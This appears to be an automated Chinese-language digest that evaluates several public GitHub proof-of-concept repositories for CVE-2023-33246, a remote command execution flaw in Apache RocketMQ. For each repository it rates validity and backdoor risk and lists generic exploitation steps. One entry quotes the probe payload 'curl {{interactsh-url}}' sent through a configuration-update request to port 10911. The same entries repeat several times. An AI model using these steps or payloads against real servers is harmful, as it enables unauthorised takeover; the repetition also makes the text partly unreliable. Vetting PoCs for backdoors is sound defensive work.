**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #13

**来源**: [CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md](../2023/CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和Controller组件暴露在公网上，且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。受影响的版本是5.1.0及以下。攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能执行命令：** 由于RocketMQ的某些组件（如NameServer、Broker和Controller）暴露在公网上，并且缺乏适当的权限验证，攻击者可以利用更新配置的功能，注入恶意配置，从而以运行RocketMQ的系统用户身份执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者也可以通过构造恶意的RocketMQ协议内容来达到相同的效果。

**有效性：**

根据漏洞库信息和搜索引擎结果，此漏洞被广泛认为是可以被利用的。CISA的已知被利用漏洞目录（KEV）中也包含了此漏洞，表明该漏洞已被积极利用。
提供的 Dockerfile 文件，显示这是一个使用Go语言编写的漏洞利用程序。它编译代码并将其作为容器的入口点执行。存在两个公开可用的exp库(https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT, https://github.com/jakabakos/CVE-2023-33246_Apache_RocketMQ_RCE )证明了漏洞的可利用性

**投毒风险：**

提供的代码片段主要是Dockerfile和License。Dockerfile描述了如何构建和运行exploit程序，但是没有直接体现exploit的具体行为。因此，需要分析exploit代码的具体逻辑才能判断是否存在投毒代码。考虑到只是构建过程，本身没有明显的投毒迹象。但是，由于最终的exploit二进制文件来自于构建过程，如果构建过程中存在恶意篡改，则可能存在投毒风险。所以投毒的风险为低。例如，可能存在在编译过程中下载其他恶意库并链接，或者直接修改编译后的二进制文件。

**利用方式：**

1.  **找到暴露在公网上的RocketMQ组件：** 首先，攻击者需要确定目标RocketMQ集群的NameServer、Broker或Controller组件是否暴露在公网上。
2.  **利用更新配置功能或伪造协议：** 攻击者可以构造恶意的请求，利用更新配置功能或者伪造RocketMQ协议内容，将恶意命令注入到目标系统中。
3.  **执行任意命令：** 成功利用漏洞后，攻击者可以以运行RocketMQ的系统用户身份执行任意命令，从而控制整个系统。

**项目地址:** [vulncheck-oss/fetch-broker-conf](https://github.com/vulncheck-oss/fetch-broker-conf)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---



---

## POC #10

**来源**: [CVE-2023-33246-SuperZero_CVE-2023-33246.md](../2023/CVE-2023-33246-SuperZero_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ NameServer, Broker, 或 Controller组件暴露在公网且无权限验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-33246是Apache RocketMQ 5.1.0及以下版本中存在的远程代码执行漏洞。根据漏洞描述，当RocketMQ的NameServer、Broker或Controller组件暴露在公网且缺乏权限验证时，攻击者可以通过更新配置功能或者伪造RocketMQ协议内容来执行任意命令，从而完全控制服务器。

**有效性：**
根据CISA KEV目录、NVD、Arctic Wolf等多个信息源，此漏洞已被积极利用，并存在公开可用的PoC代码，因此判断该漏洞的PoC代码有效。

**投毒风险：**
提供的PoC代码（从README.md文件来看）是一个Java程序，通过命令行参数指定目标IP地址和要执行的命令。 风险较低，因为如果存在后门,一般在jar包里面,而不是README.md说明文件里，用户可以使用反编译工具分析jar包。

**利用方式：**
利用方式主要有两种：

1.  **更新配置功能：** 攻击者利用RocketMQ的配置更新接口，注入恶意命令到配置项中，导致服务器执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者构造包含恶意命令的RocketMQ协议数据包，发送到目标服务器，触发远程代码执行。

总而言之，利用此漏洞需要目标服务器存在可被攻击的RocketMQ组件且未进行严格的权限控制。 搜索引擎结果显示该漏洞已被DreamBus僵尸网络利用，说明该漏洞具有较高的威胁性。

**项目地址:** [SuperZero/CVE-2023-33246](https://github.com/SuperZero/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #11

**来源**: [CVE-2023-33246-d0rb_CVE-2023-33246.md](../2023/CVE-2023-33246-d0rb_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker或Controller组件暴露在公网上，且没有进行严格的权限验证。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以利用RocketMQ的配置更新功能，在未授权的情况下执行任意命令，从而控制服务器。

**有效性：**
根据提供的PoC代码，该漏洞利用的有效性较高。该PoC通过构造恶意的配置更新请求，其中包含可以执行任意命令的payload（curl {{interactsh-url}}），然后将该请求发送到RocketMQ的服务器端口(通常是10911端口)。如果服务器存在漏洞，就会执行该命令。

**投毒风险：**
分析提供的PoC代码，未发现明显的投毒代码。PoC代码的主要功能是利用漏洞执行命令，没有发现任何额外恶意行为或后门。Payload是`curl {{interactsh-url}}`，只是用来验证漏洞是否存在，并非真正的恶意指令，所以投毒风险评估为0%。

**利用方式：**
1.  **漏洞发现：** 确认目标系统运行着存在漏洞的Apache RocketMQ版本（<= 5.1.0）。
2.  **组件确认：** 确认NameServer, Broker或Controller组件暴露在公网上且未做鉴权。
3.  **构造Payload：** 构造包含恶意命令的Payload。PoC代码中使用`curl {{interactsh-url}}`进行验证，实际利用中可以替换为其他命令。
4.  **发送请求：** 将构造好的Payload封装在配置更新请求中，发送到目标服务器的端口（通常是10911）。
5.  **执行命令：** 如果漏洞存在且利用成功，服务器将执行Payload中的恶意命令。

总而言之，此漏洞的利用方式较为简单，PoC的利用有效性较高，且PoC代码本身未发现投毒风险。

**项目地址:** [d0rb/CVE-2023-33246](https://github.com/d0rb/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #12

**来源**: [CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md](../2023/CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ 组件（NameServer, Broker, Controller）暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 允许攻击者通过利用 RocketMQ 的更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，以运行 RocketMQ 的系统用户身份。漏洞存在于 RocketMQ 5.1.0 及以下版本。

**漏洞利用方式：**

1.  **利用更新配置功能：** 攻击者可以发送恶意请求，修改 RocketMQ 的配置，从而执行任意系统命令。
2.  **伪造 RocketMQ 协议内容：**  攻击者可以构造恶意的 RocketMQ 协议数据包，诱导 RocketMQ 服务端执行恶意代码。

**POC有效性评估：**

根据漏洞描述、搜索结果（特别是GitHub链接）和CISA KEV目录信息，可以确定存在可用的POC，并且该漏洞已经被积极利用。

**投毒风险评估：**

提供的代码片段看起来是构建文件（BUILD.bazel）、构建说明(BUILDING)和贡献指南(CONTRIBUTING.md)，这些文件本身不太可能包含恶意代码。但是，漏洞的利用可能涉及修改配置文件或发送特定格式的数据包，这些恶意配置或数据包可能包含投毒代码。因此，仓库中存在作者隐藏的投毒代码的风险较低，大约为10%。 主要风险在于后续利用过程中引入恶意配置或载荷的可能性。

**项目地址:** [shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0](https://github.com/shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #13

**来源**: [CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md](../2023/CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和Controller组件暴露在公网上，且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。受影响的版本是5.1.0及以下。攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能执行命令：** 由于RocketMQ的某些组件（如NameServer、Broker和Controller）暴露在公网上，并且缺乏适当的权限验证，攻击者可以利用更新配置的功能，注入恶意配置，从而以运行RocketMQ的系统用户身份执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者也可以通过构造恶意的RocketMQ协议内容来达到相同的效果。

**有效性：**

根据漏洞库信息和搜索引擎结果，此漏洞被广泛认为是可以被利用的。CISA的已知被利用漏洞目录（KEV）中也包含了此漏洞，表明该漏洞已被积极利用。
提供的 Dockerfile 文件，显示这是一个使用Go语言编写的漏洞利用程序。它编译代码并将其作为容器的入口点执行。存在两个公开可用的exp库(https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT, https://github.com/jakabakos/CVE-2023-33246_Apache_RocketMQ_RCE )证明了漏洞的可利用性

**投毒风险：**

提供的代码片段主要是Dockerfile和License。Dockerfile描述了如何构建和运行exploit程序，但是没有直接体现exploit的具体行为。因此，需要分析exploit代码的具体逻辑才能判断是否存在投毒代码。考虑到只是构建过程，本身没有明显的投毒迹象。但是，由于最终的exploit二进制文件来自于构建过程，如果构建过程中存在恶意篡改，则可能存在投毒风险。所以投毒的风险为低。例如，可能存在在编译过程中下载其他恶意库并链接，或者直接修改编译后的二进制文件。

**利用方式：**

1.  **找到暴露在公网上的RocketMQ组件：** 首先，攻击者需要确定目标RocketMQ集群的NameServer、Broker或Controller组件是否暴露在公网上。
2.  **利用更新配置功能或伪造协议：** 攻击者可以构造恶意的请求，利用更新配置功能或者伪造RocketMQ协议内容，将恶意命令注入到目标系统中。
3.  **执行任意命令：** 成功利用漏洞后，攻击者可以以运行RocketMQ的系统用户身份执行任意命令，从而控制整个系统。

**项目地址:** [vulncheck-oss/fetch-broker-conf](https://github.com/vulncheck-oss/fetch-broker-conf)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---



---

## POC #10

**来源**: [CVE-2023-33246-SuperZero_CVE-2023-33246.md](../2023/CVE-2023-33246-SuperZero_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ NameServer, Broker, 或 Controller组件暴露在公网且无权限验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-33246是Apache RocketMQ 5.1.0及以下版本中存在的远程代码执行漏洞。根据漏洞描述，当RocketMQ的NameServer、Broker或Controller组件暴露在公网且缺乏权限验证时，攻击者可以通过更新配置功能或者伪造RocketMQ协议内容来执行任意命令，从而完全控制服务器。

**有效性：**
根据CISA KEV目录、NVD、Arctic Wolf等多个信息源，此漏洞已被积极利用，并存在公开可用的PoC代码，因此判断该漏洞的PoC代码有效。

**投毒风险：**
提供的PoC代码（从README.md文件来看）是一个Java程序，通过命令行参数指定目标IP地址和要执行的命令。 风险较低，因为如果存在后门,一般在jar包里面,而不是README.md说明文件里，用户可以使用反编译工具分析jar包。

**利用方式：**
利用方式主要有两种：

1.  **更新配置功能：** 攻击者利用RocketMQ的配置更新接口，注入恶意命令到配置项中，导致服务器执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者构造包含恶意命令的RocketMQ协议数据包，发送到目标服务器，触发远程代码执行。

总而言之，利用此漏洞需要目标服务器存在可被攻击的RocketMQ组件且未进行严格的权限控制。 搜索引擎结果显示该漏洞已被DreamBus僵尸网络利用，说明该漏洞具有较高的威胁性。

**项目地址:** [SuperZero/CVE-2023-33246](https://github.com/SuperZero/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #11

**来源**: [CVE-2023-33246-d0rb_CVE-2023-33246.md](../2023/CVE-2023-33246-d0rb_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker或Controller组件暴露在公网上，且没有进行严格的权限验证。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以利用RocketMQ的配置更新功能，在未授权的情况下执行任意命令，从而控制服务器。

**有效性：**
根据提供的PoC代码，该漏洞利用的有效性较高。该PoC通过构造恶意的配置更新请求，其中包含可以执行任意命令的payload（curl {{interactsh-url}}），然后将该请求发送到RocketMQ的服务器端口(通常是10911端口)。如果服务器存在漏洞，就会执行该命令。

**投毒风险：**
分析提供的PoC代码，未发现明显的投毒代码。PoC代码的主要功能是利用漏洞执行命令，没有发现任何额外恶意行为或后门。Payload是`curl {{interactsh-url}}`，只是用来验证漏洞是否存在，并非真正的恶意指令，所以投毒风险评估为0%。

**利用方式：**
1.  **漏洞发现：** 确认目标系统运行着存在漏洞的Apache RocketMQ版本（<= 5.1.0）。
2.  **组件确认：** 确认NameServer, Broker或Controller组件暴露在公网上且未做鉴权。
3.  **构造Payload：** 构造包含恶意命令的Payload。PoC代码中使用`curl {{interactsh-url}}`进行验证，实际利用中可以替换为其他命令。
4.  **发送请求：** 将构造好的Payload封装在配置更新请求中，发送到目标服务器的端口（通常是10911）。
5.  **执行命令：** 如果漏洞存在且利用成功，服务器将执行Payload中的恶意命令。

总而言之，此漏洞的利用方式较为简单，PoC的利用有效性较高，且PoC代码本身未发现投毒风险。

**项目地址:** [d0rb/CVE-2023-33246](https://github.com/d0rb/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #12

**来源**: [CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md](../2023/CVE-2023-33246-shoucheng3_apache__rocketmq_CVE-2023-33246_5-1-0.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ 组件（NameServer, Broker, Controller）暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 允许攻击者通过利用 RocketMQ 的更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，以运行 RocketMQ 的系统用户身份。漏洞存在于 RocketMQ 5.1.0 及以下版本。

**漏洞利用方式：**

1.  **利用更新配置功能：** 攻击者可以发送恶意请求，修改 RocketMQ 的配置，从而执行任意系统命令。
2.  **伪造 RocketMQ 协议内容：**  攻击者可以构造恶意的 RocketMQ 协议数据包，诱导 RocketMQ 服务端执行恶意代码。

**POC有效性评估：**

根据漏洞描述、搜索结果（特别是GitHub链接）和CISA KEV目录信息，可以确定存在可用的POC，并且该漏洞已经被积极利用。

**投毒风险评估：**

提供的代码片段看起来是构建文件（BUILD.bazel）、构建说明(BUILDING)和贡献指南(CONTRIBUTING.md)，这些文件本身不太可能包含恶意代码。但是，漏洞的利用可能涉及修改配置文件或发送特定格式的数据包，这些恶意配置或数据包可能包含投毒代码。因此，仓库中存在作者隐藏的投毒代码的风险较低，大约为10%。 主要风险在于后续利用过程中引入恶意配置或载荷的可能性。

**项目地址:** [shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0](https://github.com/shoucheng3/apache__rocketmq_CVE-2023-33246_5-1-0)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #13

**来源**: [CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md](../2023/CVE-2023-33246-vulncheck-oss_fetch-broker-conf.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和Controller组件暴露在公网上，且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。受影响的版本是5.1.0及以下。攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能执行命令：** 由于RocketMQ的某些组件（如NameServer、Broker和Controller）暴露在公网上，并且缺乏适当的权限验证，攻击者可以利用更新配置的功能，注入恶意配置，从而以运行RocketMQ的系统用户身份执行任意命令。
2.  **伪造RocketMQ协议内容：** 攻击者也可以通过构造恶意的RocketMQ协议内容来达到相同的效果。

**有效性：**

根据漏洞库信息和搜索引擎结果，此漏洞被广泛认为是可以被利用的。CISA的已知被利用漏洞目录（KEV）中也包含了此漏洞，表明该漏洞已被积极利用。
提供的 Dockerfile 文件，显示这是一个使用Go语言编写的漏洞利用程序。它编译代码并将其作为容器的入口点执行。存在两个公开可用的exp库(https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT, https://github.com/jakabakos/CVE-2023-33246_Apache_RocketMQ_RCE )证明了漏洞的可利用性

**投毒风险：**

提供的代码片段主要是Dockerfile和License。Dockerfile描述了如何构建和运行exploit程序，但是没有直接体现exploit的具体行为。因此，需要分析exploit代码的具体逻辑才能判断是否存在投毒代码。考虑到只是构建过程，本身没有明显的投毒迹象。但是，由于最终的exploit二进制文件来自于构建过程，如果构建过程中存在恶意篡改，则可能存在投毒风险。所以投毒的风险为低。例如，可能存在在编译过程中下载其他恶意库并链接，或者直接修改编译后的二进制文件。

**利用方式：**

1.  **找到暴露在公网上的RocketMQ组件：** 首先，攻击者需要确定目标RocketMQ集群的NameServer、Broker或Controller组件是否暴露在公网上。
2.  **利用更新配置功能或伪造协议：** 攻击者可以构造恶意的请求，利用更新配置功能或者伪造RocketMQ协议内容，将恶意命令注入到目标系统中。
3.  **执行任意命令：** 成功利用漏洞后，攻击者可以以运行RocketMQ的系统用户身份执行任意命令，从而控制整个系统。

**项目地址:** [vulncheck-oss/fetch-broker-conf](https://github.com/vulncheck-oss/fetch-broker-conf)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

